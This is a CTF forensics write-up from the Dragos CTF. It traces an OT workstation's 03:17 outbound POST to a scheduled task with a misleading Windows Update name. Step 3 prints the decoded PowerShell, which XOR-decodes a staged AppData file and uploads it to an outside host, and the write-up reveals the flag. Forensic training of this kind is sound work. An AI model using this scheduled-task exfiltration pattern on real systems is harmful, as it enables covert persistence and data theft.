# Please Schedule an Appointment

> An OT engineering workstation made a three-second outbound POST at 03:17. The triage package has the scheduled tasks and the user profile. Where did the data go?
> **Flag:** `10.4.20.15`

---

## Solution

### 1. Inventory the package

```bash
$ unzip ScheduledTasks.zip -d extracted/
$ find extracted -type f
```

The archive contains seven task XMLs and one AppData file:
`AppData/Roaming/Microsoft/Windows/Themes/aero.tmp`.

### 2. Inspect task actions

```bash
$ grep -aE "<Command>|<Arguments>" extracted/ScheduledTasks/*.xml
```

Two tasks launch `powershell.exe -EncodedCommand`:

- `Microsoft_Windows_UpdateOrchestrator_USO_UxBroker_Display.xml`
- `Microsoft_Windows_WindowsUpdate_AutomaticAppUpdate.xml` (decoy)

### 3. Decode the first payload

`-EncodedCommand` is Base64 of UTF-16LE:

```bash
$ grep -oP '(?<=-EncodedCommand ).*(?=</Arguments>)' \
    extracted/ScheduledTasks/Microsoft_Windows_UpdateOrchestrator_USO_UxBroker_Display.xml \
  | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```powershell
$xk=0x37;$p="$env:APPDATA\Microsoft\Windows\Themes\aero.tmp";
$b=[System.IO.File]::ReadAllBytes($p);
$f=($b|%{[char]($_ -bxor $xk)})-join'';
[System.Net.WebClient]::new().UploadString("http://10.4.20.15/collect","POST",$f)
```

### 4. Decode the staged file

The task XORs every byte of `aero.tmp` with `0x37` before uploading:

```bash
$ python3 -c "d=open('extracted/AppData/Roaming/Microsoft/Windows/Themes/aero.tmp','rb').read(); print(bytes(b^0x37 for b in d).decode())"
CTF{l1v1ng_0ff_th3_sch3dul3r_l4nd}
```

### 5. Rule out the decoy

The second task only runs `Get-WinEvent` and `Export-Csv` to
`$env:TEMP\wu_health.csv`; it has no network activity.

### 6. Flag

The POST goes to `http://10.4.20.15/collect`, so the answer is:

```text
10.4.20.15
```

## Lesson

Scheduled tasks are a favourite persistence and exfiltration trigger. Legitimate
Windows task names mean nothing: read the `<Command>` and decode every
`-EncodedCommand` you find.

---

### Credits

This writeup is part of the **Dragos CTF**. Offline file analysis (no live instance).
